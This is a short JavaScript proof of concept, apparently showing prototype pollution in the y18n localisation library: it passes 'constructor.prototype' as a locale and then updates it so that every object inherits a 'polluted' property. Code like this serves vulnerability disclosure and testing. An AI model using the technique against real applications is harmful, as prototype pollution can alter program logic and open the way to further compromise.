var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const y18n = require('y18n')();
obj = {};
console.log({}.polluted);
y18n.setLocale('constructor.prototype');
y18n.updateLocale({ polluted: 'yes' });
console.log({}.polluted);